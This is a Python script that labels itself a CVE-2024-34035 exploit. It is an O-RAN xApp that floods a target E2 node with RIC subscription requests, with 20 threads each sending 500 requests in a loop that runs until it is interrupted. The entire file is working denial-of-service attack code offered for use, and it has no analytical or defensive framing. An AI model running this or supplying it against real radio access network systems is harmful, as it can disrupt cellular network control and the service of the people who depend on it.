#!/usr/bin/env python3

import argparse
import json
import signal
import time
import threading
from ricxappframe.xapp_frame import Xapp

class E2FloodXapp(Xapp):
    def __init__(self):
        super().__init__(entrypoint=self._dummy_entrypoint, rmr_port=4560)
        self._shutdown = False
        self._active_subs = []
        self._lock = threading.Lock()

    def _dummy_entrypoint(self):
        pass

    def _create_sub_request(self, e2_node_id):
        return {
            "subscriptionId": f"exploit_{int(time.time())}",
            "clientEndpoint": {
                "host": "localhost",
                "httpPort": 8080,
                "rmrPort": 4560
            },
            "meid": e2_node_id,
            "ranFunctionId": 2,
            "subscriptionDetails": [{
                "actionToBeSetupList": [{
                    "actionId": 1,
                    "actionType": "report",
                    "actionDefinition": {
                        "reportingPeriod": 1000,
                        "reportingFormat": 1
                    }
                }]
            }]
        }

    def _burst_attack(self, e2_node_id, count=500):
        for _ in range(count):
            try:
                sub_request = self._create_sub_request(e2_node_id)
                payload = json.dumps(sub_request).encode('utf-8')
                success = self.rmr_send(payload, 12050)  # RIC_SUB_REQ=12050
                
                if success:
                    with self._lock:
                        self._active_subs.append(sub_request["subscriptionId"])
            except Exception as e:
                print(f"Send error: {str(e)}")

    def _sustained_attack(self, e2_node_id):
        while not self._shutdown:
            workers = []
            for _ in range(20):
                t = threading.Thread(
                    target=self._burst_attack,
                    args=(e2_node_id, 500)
                )
                workers.append(t)
                t.start()
            
            for t in workers:
                t.join()
            
            print(f"Total subscriptions sent: {len(self._active_subs)}")
            time.sleep(0.5)

    def signal_handler(self, sig, frame):
        print("\nTerminating attack...")
        self._shutdown = True
        super().stop()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2024-34035 Exploit xApp')
    parser.add_argument('--e2-node', required=True, help='Target E2 Node ID')
    args = parser.parse_args()

    xapp = E2FloodXapp()
    signal.signal(signal.SIGINT, xapp.signal_handler)
    
    try:
        attack_thread = threading.Thread(
            target=xapp._sustained_attack,
            args=(args.e2_node,)
        )
        attack_thread.start()
        xapp.run()
    except KeyboardInterrupt:
        xapp.signal_handler(None, None)
